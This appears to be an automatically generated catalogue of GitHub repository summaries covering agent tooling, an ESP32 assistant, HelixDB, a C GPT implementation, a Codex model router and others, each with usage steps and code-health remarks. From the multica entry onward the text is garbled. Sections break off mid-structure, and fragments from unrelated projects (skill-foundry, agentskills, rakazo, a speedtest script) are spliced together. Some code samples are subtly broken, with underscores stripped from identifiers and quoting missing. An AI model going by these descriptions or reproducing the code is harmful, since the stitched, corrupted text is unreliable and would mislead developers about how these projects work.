forks.name: omp-best-of
forks.description: Best-of-N coding agents with LLM-as-a-Verifier selection for Oh My Pi: isolated git worktrees, verifier-ranked trajectories, winner-only patch application
forks.summary:
The Problem  
When a single Oh My Pi (OMP) run fails to produce a correct fix, developers must manually iterate, which is time‑consuming and error‑prone. Selecting the best solution from multiple candidate agents adds further friction because there is no built‑in ranking or safe patch application.

What This Does  
omp‑best‑of runs N independent OMP agents in isolated copy‑on‑write workspaces, captures each full execution trajectory (exit code, usage, generated patch), and ranks the results with an LLM‑as‑a‑Verifier backend or a sampled OMP judge. The CLI (src/cli.ts) outputs the winning patch and, when --apply is supplied, applies only that patch to the original HEAD if the working tree remains clean.  

Key files:  

 src/cli.ts – entry point that parses --n, --apply, and verifier options.  
 bench/run.ts – orchestrates workspace creation, parallel OMP sessions, and artifact collection.  
 bench/tasks//repo/.js – concrete candidate implementations (e.g., memoize.js, circuit-breaker.js).  
 bench/tasks//oracle/.test.js – reference oracle tests used by the verifier.  

The plugin is deliberately modular: each benchmark task ships its own package.json, allowing per‑task npm dependencies while the core runner stays language‑agnostic.

How To Use It  
Clone the repo
git clone https://github.com/moses-y/omp-best-of
cd omp-best-of
Install Bun (required runtime)
curl -fsSL https://bun.sh/install | bash
export PATH="$HOME/.bun/bin:$PATH"
(Optional) Install per‑task npm deps – the runner will npm install lazily.
No root package.json, so no global install step is needed.
Ensure OMP 17+, a clean git tree, and uv (for the logprob verifier) are available.
Example: omp --version and uv --version.
Run the CLI
bun run src/cli.ts --n 5 --apply "Fix the failing authentication test"

Configuration – The CLI reads OMP model/thinking flags from the current session; you can override them with --model and --thinking. The logprob verifier defaults to the deepseek/deepseek-v4-flash model and requires a reachable OMP model‑registry endpoint. No additional config files are required; all defaults are hard‑coded in src/cli.ts and bench/run.ts.

Running tests – The repository ships 57 test files (e.g., bench/tasks/async-memoize/repo/memoize.test.js). Execute them with the bundled CI workflow (.github/workflows/ci.yml) or manually via bun test inside each task directory.

Real‑World Use  
A CI pipeline for a microservice can invoke omp-best-of on failing integration tests. The pipeline checks out the repository, runs bun run src/cli.ts --n 3 to generate three candidate patches, lets the logprob verifier rank them, and automatically applies the winning patch if the repository remains clean. This reduces mean‑time‑to‑repair from hours (manual debugging) to minutes, while preserving auditability through the generated trajectory artifacts.

Code Health & Issues  
Low – Missing lockfiles – Each bench/tasks/*/repo/package.json lacks a corresponding package-lock.json or pnpm-lock.yaml, making builds non‑reproducible. (bench/tasks/async-memoize/repo/package.json is representative).  
Medium – No root package manager config – The top‑level directory has no package.json or lockfile, so dependency management relies on per‑task files; this can cause version drift across tasks.  
Low – No test coverage for CLI – Tests exist for individual task implementations but none target src/cli.ts, leaving the orchestration layer unvalidated.  
Info – CI present – GitHub Actions workflow (.github/workflows/ci.yml) runs the test suite on push, indicating an automated quality gate.  
Info – Documentation – README provides usage examples and high‑level architecture; additional docs are limited to task‑specific markdown files.

No critical security issues (e.g., exposed secrets) are evident from the file list.

The Bottom Line  
omp-best-of delivers a practical “run‑many‑candidates‑and‑pick‑the‑best” workflow for Oh My Pi users, with a clear CLI and automated ranking. It is well‑structured for extension but suffers from inconsistent dependency lock management and limited test coverage of the core orchestrator. Teams that already use OMP and need faster patch selection will find it useful; small or security‑sensitive projects should address the lockfile and test gaps before adopting.

issues.issue: Dependencies declared without a lockfile - non-reproducible builds

forks.name: zclaw
forks.description: Your personal AI assistant at all-in 888KiB (~35KB in app code). Running on an ESP32. GPIO, cron, custom tools, memory, and more.
forks.summary:
zclaw: Technical Briefing

Project Summary

zclaw is a C-based AI personal assistant running on ESP32-class hardware with a strict all-in firmware budget of <= 888 KiB. The repository contains 204 files across C source/headers (125 files), Python (14 files), Shell (24 files), and web assets. Primary entry point is main/main.c.

Code Health & Measured Analysis

Static analysis findings:
67 test files present across test/host/ and test/api/ directories, covering LLM providers (Anthropic, OpenAI, OpenRouter), tool runtime, GPIO, I2C, memory, ratelimit, and Telegram integration
GitHub Actions CI with 6 workflows: firmware-size-guard.yml, firmware-stack-guard.yml, firmware-target-matrix.yml, host-tests.yml, and release.yml
License: LICENSE file present at root
Lockfile: No package-lock.json or similar detected; Python dependencies managed via scripts/requirements-web-relay.txt
Structural completeness: .gitignore, CHANGELOG.md, VERSION file present

Hardware & Build
Tested targets: ESP32, ESP32-C3, ESP32-S3, ESP32-C6
Recommended starter: Seeed XIAO ESP32-C3
Build system: CMake with main/CMakeLists.txt and root CMakeLists.txt
Configuration: sdkconfig.defaults and variant-specific defaults (sdkconfig.esp32-t-relay.defaults, sdkconfig.esp32s3-box-3.defaults, sdkconfig.qemu.defaults)
Size guard: CI includes firmware-size-guard.yml enforcing the 888 KiB all-in cap

Runtime Capabilities
LLM provider support: Anthropic, OpenAI, OpenRouter, Ollama (custom endpoint)
Scheduled tasks: daily, periodic, and one-shot once via cron infrastructure (main/cron.c, main/cronutils.c)
GPIO control: gpioreadall, guardrails via main/gpiopolicy.c
I2C: i2cscan, i2cread, i2cwrite via main/toolsi2c.c
DHT: dhtread via main/toolsdht.c
Persistent memory: main/memory.c with main/memorykeys.c
Rate limits: Compile-time configurable in main/config.h (RATELIMIT)
Diagnostics: get_diagnostics (quick/runtime/memory/rates/time/all scopes)
Persona options: neutral, friendly, technical, witty
Telegram integration: Bot token, chat ID allowlist via main/telegram.c family

Configuration & Credentials
WiFi + LLM credentials: provisioned via ./scripts/provision.sh or ./scripts/provision-dev.sh
Secure flash: ./scripts/flash-secure.sh with encrypted credentials
Rate limit overrides: main/config.h compile-time
No evidence of committed secrets in the repo structure

Shortcomings
No package manager lockfile detected; Python dependency resolution may require manual attention
67 test files exist but host test infrastructure (test/host/) is tightly coupled to ESP-IDF/FreeRTOS mocks; porting to non-ESP environments would require adaptation
Express-based docs site (docs-site/app.js) is separate from firmware; no evidence of API documentation generation from the C codebase

Bottom Line

zclaw is a well-structured ESP32 firmware project delivering a functional AI assistant within a stringent 888 KiB all-in footprint. CI guards enforce the size constraint, and 67 tests cover the runtime and API integration layers. Best suited for individual hackers or small teams building ESP32-edge AI tools where firmware size is a constraint. Not recommended for projects requiring portability beyond the ESP-IDF ecosystem or large-scale multi-device provisioning without tooling adaptation.

Clone: https://github.com/moses-y/zclaw (verbatim)

forks.name: 100-days-of-inference
forks.description: 100 days of LLM inference engineering — daily posts, experiments, and visualizations
forks.summary:
The Problem

Serving LLMs in production spans a wide stack—CUDA kernels, quantization, serving engines, autoscaling, and multi-cloud capacity. Most engineers learn these topics in isolation, with no structured path from "how a transformer generates text" to "how to deploy across clouds without downtime." The repo addresses that gap with a day-by-day curriculum that pairs each concept with a runnable notebook.

What This Does

100-days-of-inference is a structured deep-dive into inference engineering, built around Philip Kiely's Inference Engineering (Baseten Books, 2026). It covers three phases: Runtime (single-instance optimization), Infrastructure (scaling across clusters), and Tooling (observability and client code), plus a fourth phase for building components from scratch. The author runs all experiments on a home-lab cluster of two NVIDIA DGX Sparks.

The repo contains 27 Jupyter notebooks, one per day, organized in day01/ through day26/ directories. Each has a README.md explaining the topic. The progression is deliberate: day07/cuda-kernels.ipynb covers kernel fusion, day09/vllm-paged-attention.ipynb covers PagedAttention, day13/quantization-number-formats.ipynb covers FP8/INT8/INT4 formats, and day18/disaggregation-prefill-decode.ipynb covers prefill/decode splitting. A root-level Inference Engineering.pdf is the reference text.

How To Use It

Setup: The repo is a collection of Jupyter notebooks. You need a Python environment with Jupyter and CUDA-capable hardware to run the GPU experiments. There's no requirements.txt or pyproject.toml, so you'll need to install dependencies per-notebook (PyTorch, vLLM, etc.) yourself.

Running it: Open a notebook and execute cells in order. The README says each entry is a runnable script. Start with day01/llm-inference-mechanics.ipynb to see the end-to-end generation loop, then follow the day order. The Phase 4 projects (BPE tokenizer, decoder loop, SDPA, etc.) are listed in the README but don't have dedicated directories yet.

git clone https://github.com/moses-y/100-days-of-inference
cd 100-days-of-inference
jupyter notebook day01/llm-inference-mechanics.ipynb

Real-World Use

This fits a team ramping up on inference engineering, or an individual building a mental model of the full serving stack. The day-by-day structure maps directly to production decisions: after day09 you understand why vLLM's PagedAttention matters for throughput; after day13 and day14 you can reason about quantization trade-offs; after day23 and day24 you can evaluate autoscaling and routing strategies. Each notebook is a self-contained experiment you can adapt to your own model and hardware.

Code Health & Issues

Deep analysis has not been run on this repo, so the following is based on the file structure only.
Medium - No CI/CD pipeline - there's no .github/ directory or CI config, so there's no automated test or build gate.
Medium - No LICENSE file - usage and redistribution rights are unclear, which matters if you plan to reuse the notebook content internally.
Low - Single test file - the repo has 27 notebooks but only 1 test file, so most content is unverified by automated checks.

The Bottom Line

A well-structured, practical curriculum for learning inference engineering end-to-end, grounded in a real reference book and real GPU experiments. The lack of a license and CI are minor concerns for a personal learning repo. Best suited for engineers who want a guided path through the serving stack and are comfortable setting up their own Python/CUDA environment.

issues.issue: No CI/CD pipeline detected - no automated build/test gate
No LICENSE file - unclear usage/redistribution rights

forks.name: helix-db
forks.description: HelixDB is an OLTP graph-vector database built in Rust on Object Storage.
forks.summary:
The Problem  
Applications that need both graph relationships and dense vector search (e.g., RAG‑style AI agents) currently stitch together separate DBMSs, sync data pipelines, and write custom adapters. That adds latency, operational overhead, and consistency risk.

What This Does  
HelixDB is a single‑process OLTP engine that stores graph edges, vectors, KV, and relational rows on top of object storage. The core engine lives in crates/db (see crates/db/src/ for storage primitives and query execution) and is orchestrated by a thin CLI (crates/cli/src/main.rs).  

The repository ships language bindings generated with uniffi (bindings/uniffi/src/) for Rust, Python, Go, and TypeScript, exposing a JSON‑based AST defined in crates/ast/src/. The CLI (helix) uses these bindings to start a local container (Dockerfile pulls ghcr.io/helixdb/helixdb:v0.0.4) and to issue queries over HTTP (POST /v2/query).  

All build artefacts are managed by Cargo workspaces (Cargo.toml at the repo root) and Docker (Dockerfile). CI pipelines in .github/workflows/ run unit tests, fuzz targets, and coverage checks.

How To Use It  
Install the CLI (downloads a pre‑built binary that wraps the Cargo workspace)
curl -sSL "https://install.helix-db.com" | bash
Initialise a project – creates helix.toml and a .helix workspace
helix init
Start a local dev instance (runs the Docker image defined in Dockerfile)
helix start dev      # in‑memory mode
or persist to MinIO:
helix start dev --disk
or use external S3 bucket:
helix start dev --storage-uri s3://my-bucket/prefix --persist

The CLI binary is built from crates/cli/src/main.rs and packaged in crates/cli.  
If you prefer to compile locally:

cargo build --workspace        # produces ./target/debug/helix
./target/debug/helix start dev

Queries are sent as JSON AST files (e.g., examples/request.json) via the CLI:

helix query dev --file examples/request.json

For programmatic access, import the generated bindings. In Python:

from helixdb import HelixDB

db = HelixDB("http://localhost:6969")
response = db.query(json.load(open("examples/request.json")))
print(response)

The binding source lives in bindings/uniffi/src/helixdb.rs and is compiled by bindings/uniffi/Cargo.toml.

Real‑World Use  
A microservice that answers knowledge‑base questions can embed the Python binding:

from helixdb import HelixDB
import json, requests

db = HelixDB("http://localhost:6969")
def answer(question: str) -> str:
    ast = {"type":"query","graph":{"match":{"node":{"type":"Document","text":question}}}}
    resp = db.query(ast)
    return resp["results"][0]["text"]

Deploy the service alongside the HelixDB Docker container; the service only needs the endpoint URL and optional S3 credentials (HELIxSTORAGEURI, HELIxAWSACCESSKEY_ID, etc.) if persistence is required.

Code Health & Issues  
Low – Comprehensive test suite – 48 test files across crates//tests/ and fuzz targets (crates/db/fuzz/).  
Low – CI coverage – GitHub Actions run unit, integration, and coverage jobs (.github/workflows/).  
Low – License present – LICENSE file included.  
Medium – Limited public documentation for internal crates – crates/ast and crates/db lack top‑level READMEs; developers must read source.  
Medium – Binding generation step not automated in CI – bindings/uniffi rely on manual uniffi-bindgen runs; CI does not verify generated language packages.  
Low – Platform‑specific scripts – crates/cli/build.sh and install.sh assume Unix‑like shells; Windows support is unclear.  
Low – No explicit secret handling – S3 credentials are expected via environment variables; no .env template provided.

The Bottom Line  
HelixDB provides a tightly integrated graph‑vector store with first‑class Rust and multi‑language bindings, backed by a solid Cargo/Docker build pipeline and automated testing. It is ready for teams that want a single datastore for AI‑augmented applications and are comfortable with Rust tooling or container deployment. Missing pieces are richer developer docs for internal crates and automated binding generation in CI; otherwise the codebase is clean and production‑grade.

forks.name: job-application-agent
forks.description: Privacy-first Codex skill for discovering, validating, completing, and tracking job applications
forks.summary:
The Problem

Job seekers using AI coding assistants face a credibility gap: agents can generate applications but cannot verify credentials, detect duplicates, or maintain a private application ledger. The result is spammy, unverifiable submissions that reflect poorly on the candidate and waste hiring teams' time. There is no standardized way for an agent to discover roles, validate fit, fill forms with trusted data, and track outcomes—all while keeping profile data local and under the candidate's control.

What This Does

The Job Application Agent is a privacy-first Agent Skill that handles the full application lifecycle. The installer/ directory contains the deployment logic (installer/src/cli.mjs, installer/src/installer.mjs, installer/src/runner.mjs, installer/src/scheduler.mjs) that places the skill at ~/.agents/skills/job-application-agent and copies it to vendor directories like ~/.cursor/skills if present. The main skill code lives in job-application-agent/ with SKILL.md defining the contract, while scripts/ handles core operations: job-application.mjs orchestrates the application workflow, secret-store.mjs manages OS-backed profile storage, and telemetry-client.mjs sends privacy-preserving telemetry. The telemetry-worker/ provides a dashboard interface—telemetry-worker/src/worker.mjs is the worker process, telemetry-worker/src/public-stats.mjs exposes statistics, and telemetry-worker/public/ serves the UI at telemetry-worker/public/index.html with dashboard.js and styles.css. Telemetry schema and validation live in scripts/telemetry-schema.mjs and scripts/telemetry-client.mjs, with tests in telemetry-worker/tests/. GitHub Actions workflows in .github/workflows/ handle CI/CD: validate.yml, publish-npm.yml, staging-telemetry.yml, and deploy-telemetry.yml.

How To Use It

Setup: The canonical install command documented in README.md is:

npx job-application-agent@latest install

This reads package.json for the npm package name and version, then uses the installer scripts to place the skill in the agent skills directory. Confirm the installation with:

npx job-application-agent@latest status

Configuration: No environment variables or API keys are required for core functionality. Profile data is stored via scripts/secret-store.mjs using OS-backed secure storage (Keychain on macOS, Credential Manager on Windows, secret service on Linux). The windows-profile-store.ps1 script handles Windows-specific profile storage integration. Candidate profile data, the canonical résumé, and application ledgers remain outside the replaceable skill directory, as noted in the README.

Running it: Invoke the CLI from bin/job-application-agent.mjs to start a workflow. The job-application.mjs script handles discovery, qualification, and form filling using verified profile and résumé facts. The agent pauses for authentication, CAPTCHA, legal attestations, demographic questions, unclear eligibility, sensitive identifiers, and unverifiable claims—per the safety-by-design approach documented in the README.

Real-World Use

A senior engineer using a coding agent to pivot into devrel roles can run npx job-application-agent@latest install to set up the skill, then invoke the agent with targeting criteria (seniority: senior, location: remote, compensation: $150k+). The agent uses scripts/job-application.mjs to browse career pages and ATS platforms, scores matches against the candidate-defined profile, and fills application forms using only facts from the locally stored résumé. After every ten submissions, telemetry-worker/src/public-stats.mjs reviews results and proposes targeting adjustments. The local ledger in installer/ records only visibly confirmed submissions, enabling the engineer to review outcomes and adjust search criteria without exposing profile data.

Code Health & Issues
Tests & CI: 14 test files exist across installer/tests/, telemetry-worker/tests/, and job-application-agent/tests/. CI is configured via four GitHub Actions workflows in .github/workflows/, covering validation, npm publishing, and telemetry staging/deployment. License is present at LICENSE (MIT). package-lock.json ensures reproducible installs.
Security: SECURITY.md is present. The privacy model keeps profile data in OS-backed storage and browser auth in the browser, as documented in job-application-agent/references/BROWSER_UPLOADS.md and ANALYTICS.md.
Observability: Telemetry schema is defined in scripts/telemetry-schema.mjs with corresponding tests. The dashboard at telemetry-worker/public/index.html provides a public stats endpoint.
Missing: No .env files or secrets in the repo. No evidence of input validation bypass or unsafe patterns in the reviewed structure.

The Bottom Line

This is a well-structured, privacy-first Agent Skill that fills a genuine gap for candidates using AI assistants. The separation of concerns between the skill (job-application-agent/), installer (installer/), and telemetry dashboard (telemetry-worker/) is clean, and the OS-backed local storage approach addresses the primary privacy concern. It is best suited for individual job seekers or small teams who need disciplined, trackable application workflows without sacrificing data privacy. Teams requiring enterprise-grade SSO, custom ATS integrations, or large-scale bulk applying will find the local-first design constraining.

forks.name: microgpt-c
forks.description: The most atomic way to train and inference a GPT in pure, dependency-free C
forks.summary:
The Problem  
Generating or fine‑tuning a language model on a tiny corpus (e.g., a list of names) usually requires heavyweight frameworks, external dependencies, and a sizable build chain. Teams that need a completely self‑contained binary for experiments, embedded devices, or teaching must strip everything down to the basics.

What This Does  
src/microgpt.c implements a character‑level transformer with forward, back‑propagation, Adam optimizer, and sampling in a single C source file. The code relies only on the C standard library, making it portable across macOS, Linux, Windows (MSYS2), and ARM64/AVX2 targets. The Makefile detects the host CPU and selects the appropriate SIMD flags (-mfpu=neon or -mavx2).  

Training runs on a 32 k‑line name list in a few seconds, producing a model of 4 192 parameters. Inference is exposed via gptforwardinfer, a fast single‑token path whose logits match the full forward pass to within fp32 rounding. Performance numbers are documented in docs/PERFORMANCE.md.

How To Use It  

Setup  
git clone https://github.com/yourorg/microgpt-c.git
cd microgpt-c
make          # builds microgpt (debug) and microgptopt (optimized)

The repository supplies a single Makefile; no external libraries are required.

Configuration  
Training data must be a plain‑text file with one token sequence per line. The example dataset is data/names.txt. No additional config files or environment variables are needed.

Running  
Train and sample in one step (default 20 000 steps)
make run          # runs: ./microgpt data/names.txt

Or invoke the binary directly
./microgpt data/names.txt

The binary prints training progress, loss statistics, and a set of sampled names, matching the README output.

Real‑World Use  
A micro‑service that generates product SKUs could embed the compiled microgptopt binary, feed it a list of existing SKUs at startup, and call ./microgptinfer <prefix> via a lightweight wrapper script to obtain context‑aware suggestions. The entire stack fits in a few kilobytes, eliminating the need for Python or GPU drivers.

// example integration (pseudo‑code)
system("./microgptinfer data/skus.txt > suggestion.txt");

Code Health & Issues  
Medium – No test suite – repository lacks any *_test.c or testing framework; code paths are unverified automatically.  
Medium – No CI/CD – no .github/workflows or other CI configuration; builds are manual, increasing risk of regressions.  
Low – Minimal error handling – microgpt.c assumes well‑formed input files; missing file or malformed line triggers fprintf + exit(1) without graceful recovery.  
Low – Single‑file architecture – all logic resides in one source file, which hampers modular testing and future extensions.  
Low – Documentation scoped to performance – docs/PERFORMANCE.md explains the fast inference path, but there is no API reference for the training functions.  
None – License present – LICENSE file included, so reuse is clear.

Overall the code compiles cleanly on supported platforms and the README accurately reflects the build/run commands.

The Bottom Line  
microgpt-c delivers a truly dependency‑free GPT implementation that can be compiled and run in seconds, ideal for demos, educational settings, or embedded contexts where size matters. The trade‑off is a lack of automated testing and CI, meaning developers should review and stress‑test the binary before production use. Suitable for solo engineers or small teams needing a minimal, transparent transformer baseline.

issues.issue: No test files detected - untested code paths
No CI/CD pipeline detected - no automated build/test gate

forks.name: codex-router
forks.description: External-model router for Codex with guided Kimi OAuth/API, DeepSeek, safe migration, and rollback.
forks.summary:
The Problem

Codex users requiring external models (Kimi, DeepSeek, Anthropic, GitHub Copilot, etc.) face fragmented authentication, per-provider installations, and no safe migration path when switching or rolling back router versions. Each integration demands its own credential setup, and there is no single gateway that preserves existing Codex models, profiles, and ChatGPT login while inserting routed alternatives.

What This Does

This repo implements a local, credential-isolating router that merges external model entries into Codex's native model catalog, so routed models appear alongside native GPT models in the picker. The codebase is split across desktop (Tauri), Electron, and a macOS tray application. Key entry points include apps/desktop/src-tauri/src/main.rs, apps/electron/main.js, and apps/macos/ModelRouterTray/Sources/ModelRouterTrayApp.swift. Provider configurations live in config/—for example, config/kimi/api/kimi.json and config/kimi/oauth/k3.json for Kimi OAuth, config/deepseek/deepseek.json for DeepSeek, and config/anthropic/anthropic.json for Anthropic. The bin/ directory contains operational scripts such as bin/migrate, bin/rollback, bin/discover-models, and bin/status. CI is configured via .github/workflows/ci.yml, .github/workflows/release.yml, and other workflow files. A Homebrew formula at Formula/codex-router.rb packages the service for macOS/Linux installation.

How To Use It

Setup: The primary install method is Homebrew: brew tap duolahypercho/codex-router && brew install codex-router, followed by codex-router setup --guided. The guided installer (install.sh at the repo root) performs one-time provider selection, credential-safe authentication, background service installation, and Codex integration. Alternatively, the guided curl installer runs curl -fsSL https://raw.githubusercontent.com/duolahypercho/codex-router/main/install.sh | sh -s -- --target codex --guided. Windows PowerShell users can invoke the hosted install.ps1. The --no-provider --no-discover flags allow validating the install/uninstall lifecycle before committing credentials.

Configuration: Provider credentials are entered through a hidden local terminal prompt during setup --guided; the repo does not commit keys. Provider-specific JSON configs reside under config/ (e.g., config/kimi/kimi.json, config/deepseek/deepseek-reasoner.json). The AGENTS.md file documents the expected agent workflow for preserving existing Codex models, profiles, and settings during migration.

Running it: After setup, fully quit and reopen Codex, then choose a routed model from the normal model picker. The router runs as a per-user background service installed by the Homebrew formula or the guided installer.

Real-World Use

A developer wants to route Kimi K3 through Codex without losing their existing OpenAI‑based models and settings. They run codex-router setup --guided, select Kimi as the provider, and the router invokes kimi login (or prompts invisibly for credentials). The guided flow detects any existing Kimi authentication, migrates recognized older config versions from config/kimi/, and adds Kimi models to Codex's picker. When switching back to OpenAI, codex-router rollback restores the prior model catalog. The same routed models also publish to the DeepSeek Harness and Gemini CLI via the Gemini-shaped endpoint the router serves.

Code Health & Issues
Tests & CI: 8 test files are present across the macOS tray, Electron, and desktop apps; CI pipelines run on every push via .github/workflows/ci.yml and release workflows. This is adequate for a project of this size.
Secrets in repo: No API keys or secrets are committed. Credential files live under config/ but are gitignored; the README explicitly states credentials are entered only through a hidden local terminal prompt.
Dependency hygiene: Node.js dependencies are locked (apps/desktop/package-lock.json, apps/electron/package-lock.json); Rust dependencies are locked via Cargo.lock. Python dependencies are managed via requirements/python.txt and refreshed into Formula/codex-router.rb by the release workflow.
Structural separation: The codebase cleanly separates desktop (Tauri), Electron, and macOS tray applications, each with their own package.json/Cargo.toml. Provider configs are modular per model.
Missing: No formal license file is present in the root (the LICENSE file exists but its contents weren't verified in the structure scan). No input validation layer is evident beyond the guided setup prompts; however, the router's credential-isolating design mitigates exposure risk.

Bottom line: This is a functional, well‑scoped router for users who need a single gateway for multiple external models within Codex. The guided setup, Homebrew packaging, and rollback/migration scripts are the strongest assets. It is best suited for individual developers or small teams wanting to add Kimi, DeepSeek, or Anthropic models without fragmenting their Codex configuration. Large organizations requiring fine‑grained access control or per‑user credential isolation may prefer a dedicated API‑gateway solution.

forks.name: multica
forks.description: Assign issues to Claude Code, Codex, Cursor, and 17 more coding agents like teammates — open-source and self-hostable.
forks.summary:
The Problem  
Developers who juggle many LLM‑based coding agents (Claude Code, Codex, Cursor, etc.) spend most of their time re‑creating context, monitoring terminals, and manually stitching results together. The lack of a shared workspace makes it hard to treat agents as teammates, leading to duplicated effort and missed hand‑offs.

What This Does  
Multica provides a self‑hosted Electron desktop app that aggregates AI agents onto a Kanban‑style board. Each agent appears as a user‑assignable assignee; once an issue is assigned, the daemon launches the selected agent’s runtime, streams its tool calls, and posts the final PR back to the originating repository. The core UI lives in apps/desktop/src/renderer/src/App.tsx, while the Electron main process (apps/desktop/src/main/index.ts) coordinates IPC, authentication, and updater logic. The daemon runtime is defined in apps/desktop/src/main/daemon-manager.ts and related files, enabling custom runtimes (e.g., local Docker containers) to be plugged in.

How To Use It  

Setup

The Problem

What This Does  
skill-foundry supplies a self‑contained pipeline that turns loose skill files into vetted Claude plugins. The core pieces are:

 Template layout – /.claude-plugin/ holds the plugin.json and marketplace.json scaffolding; skills/example-skill/ shows a minimal skill source; dist/example-skill.skill is the compiled artifact.  
 Build script – scripts/build-org-skills.sh runs the front‑matter validator, assembles .skill bundles, and aborts on any error, guaranteeing that a bad skill never overwrites a previous version.  
 Policy gate – The collection under .github/scripts/ (e.g., checksecrets.sh, validatefrontmatter.sh, checkpii.sh) performs automated scans for secrets, PII, unpinned actions, and workflow permission issues. Results are emitted as JSONL; hard failures block the PR merge.  
 CI orchestration – GitHub Actions in .github/workflows/ invoke the gate on every PR (skill-policy.yml) and keep the dist/ folder in sync (check-dist.yml). The reusable action lint-skills is defined in .github/actions/lint-skills/action.yml.  
 Orchestrator skill – .claude/skills/ship-plugin/SKILL.md is a Claude‑Code playbook that an AI agent follows to create a branch, open a PR, and record a paper trail. The human only needs to approve the PR.

How To Use It  
Provision the repo – Fork or use the “Use this template” button to create YOUR-ORG/skill-foundry. No additional dependencies are required beyond a POSIX‑compatible shell and Git.  
Add your skills – Place each new skill under skills/<skill‑name>/SKILL.md. Follow the front‑matter schema documented in tests/fixtures/clean-skill/SKILL.md.  
Run a local build (optional)  

   ./scripts/build-org-skills.sh
   # On success, updated bundles appear in dist/

   The script aborts if any validator in .github/scripts/ reports a hard failure.  
Push and let CI do the rest – Commit the new SKILL.md, push a branch, and open a PR. GitHub Actions automatically:

    Executes the policy scripts (run-checks.sh → all checks under .github/scripts/).  
    Regenerates dist/ via the same build script (check-dist.yml).  
    Posts a JSONL comment with any findings.  

   If all hard checks pass, the PR can be merged.  
Trigger the AI orchestrator – In Claude Code, load the repository and issue a natural‑language command such as:

   Package this skill file into this plugin and ship it: ~/Downloads/their-skill.skill.
   Name the plugin acme‑general.

   Claude follows the steps in .claude/skills/ship-plugin/SKILL.md, creates a branch, updates README.plugin.md, bumps the semver, and opens the PR for your final approval.

Real‑World Use  
A product team maintains a shared repo of “knowledge‑base” skills (FAQ bots, data‑lookup assistants). Each analyst writes a SKILL.md in the skills/ folder.  commands/.toml – declarative command definitions (/spec, /plan, /build, …) used by the external skills CLI.

   cd agentskills
Install the supporting CLI (the repo expects the public skills CLI, not bundled here). The README recommends:

   # or install a single skill
   npx skills add addyosmani/agent-skills --skill test-driven-development

Run the built‑in evaluations (useful for sanity‑checking a new agent integration):

   node scripts/run-evals.js               # executes all eval fixtures

   The script loads each fixture under evals/fixtures/ (e.g., browser-testing-with-devtools/server.js) and reports pass/fail against the skill definitions.
Configuration – No explicit environment files are shipped. Skills that need external resources (e.g., API keys for a cloud provider) must be supplied by the consuming agent; the repo does not contain secret placeholders.
Extending / customizing – Add a new skill by creating skills/<new‑skill>/SKILL.md following the existing anatomy (docs/skill-anatomy.md). Register a command in commands/ with a matching .toml file and update plugin.json if you want marketplace visibility.

The CLI expands the spec into a task plan (/plan) and triggers the build skill to generate incremental PRs. Each PR runs the test skill, which executes the fixture test suite (evals/fixtures/test-driven-development). When all tests pass, the review skill enforces the multi‑axis code‑review checklist before the PR is merged and finally the ship skill tags the release. All steps are auditable because each skill logs its gate outcomes.

agentskills provides a well‑structured collection of engineering best‑practice “skills” that can be plugged into AI coding agents via the public skills CLI. Infrastructure lives in infra/compose/ (Dockerfiles, docker‑compose.yml) and infra/sandboxes/ (Docker‑based computer sandbox and a supervisor service). The repository includes a static site (apps/www/) built with Astro.

Configuration defaults are defined in .env.example; the README walks through copying it to .env and setting secrets such as BETTERAUTHSECRET, ENCRYPTIONKEY, and an OpenRouter key.

How To Use It  

Setup  
From repo root
cp .env.example .env                     # create runtime config
pnpm install                             # install workspace deps (pnpm 9 required)
pnpm db:generate                         # Prisma client generation
pnpm db:migrate                          # apply migrations to local Postgres
pnpm sandbox:build                       # build Docker‑based sandbox images
pnpm dev                                 # start API, worker, web UI, sandbox supervisor

The pnpm dev script (see package.json in the root) launches:
 API on :3100 (apps/api/src/index.ts)  
 Graphile Worker (via apps/worker)  
 Vite dev server on :5173 (apps/web)  
 Sandbox supervisor on :7091 (infra/sandboxes/supervisor/src/index.ts)

Configuration  
Edit .env to provide:
 BETTERAUTHSECRET – long random string for JWT signing.  
 ENCRYPTIONKEY – AES key for server‑side encrypted storage.  
 OPENROUTERAPIKEY (or rely on UI sign‑in flow).  
 Optional COMPOSIOAPIKEY for plugin integration.

All services read these variables via apps/api/src/env.ts.

Running  
 Web UI: open <http://127.0.0.1:5173>.  
 API health check: curl http://127.0.0.1:3100/health. Expected JSON includes "runtime":"pi", "sandbox":"docker".  

Desktop and mobile clients are built with their respective package scripts (pnpm desktop, pnpm mobile – defined in each package.json).

Real‑World Use  
A SaaS product can embed rakazo as an on‑premise “AI assistant” for each tenant. After provisioning a Postgres instance and a Docker host, the tenant runs the same pnpm dev (or a Docker‑Compose production variant in infra/compose/docker-compose.prod.yml). The tenant’s backend then calls the API (/api/v1/bots) to create bots, which run isolated Docker desktops, ensuring no cross‑tenant data leakage while still allowing the tenant to choose any LLM provider via the UI.

// Example: create a bot from a backend service
await fetch(${API_URL}/bots, {
  method: 'POST',
  headers: { Authorization: Bearer ${token} },
  body: JSON.stringify({ name: 'SalesBot', model: 'gpt-4o' })
});

Code Health & Issues

What This Does

The Problem  
Network administrators and remote workers need a lightweight way to record broadband performance over days or weeks. Manual speed‑test websites are cumbersome and do not produce a historical data set that can be visualized or analysed programmatically.

The same file is read back, converted to numeric series, and plotted with matplotlib to show trends for download, upload, and latency.

Key functions live in speedtest.py:

 performspeedtest() – runs speedtest-cli --format=json and returns a dict.  
 parsespeedtestresult() – extracts download, upload, and ping values.  
 savespeedtestresult() – appends a CSV line (date,download,upload,ping) to the results file.  
 loadspeedtestresults() – reads the results file into a list of rows.  
 plotspeedtestresults() – builds a time‑series chart and displays it.

Install dependencies – the project lists its runtime requirements in requirements.txt.  
   pip install -r requirements.txt

   (requirements.txt currently pins speedtest-cli and matplotlib.)
Run the script – the entry point is the module itself.  
   python speedtest.py

   The command performs a test, prints the JSON summary to stdout, appends a line to speedtestresults.txt, and opens a Matplotlib window with the historical plot.
Inspect data – the results file (speedtestresults.txt) is plain‑text CSV; it can be opened in a spreadsheet or processed by other tools.

Example: ingest the CSV into pandas for extended analysis
import pandas as pd
df = pd.readcsv('speedtestresults.txt', header=None,
                 names=['date','download','upload','ping'])
df['date'] = pd.todatetime(df['date'])
df.setindex('date').plot(subplots=True, figsize=(10,6))

forks.name: sam
forks.description: SAM Sovereign Agent Mesh
forks.summary:
The Problem  
Deploying a trustworthy, self‑healing network for autonomous AI agents is difficult. Operators need a way to bootstrap peer‑to‑peer connectivity, enforce strong identity and policy checks, and expose a uniform tool‑invocation surface without hand‑crafting Kubernetes objects or custom TLS plumbing.

What This Does  
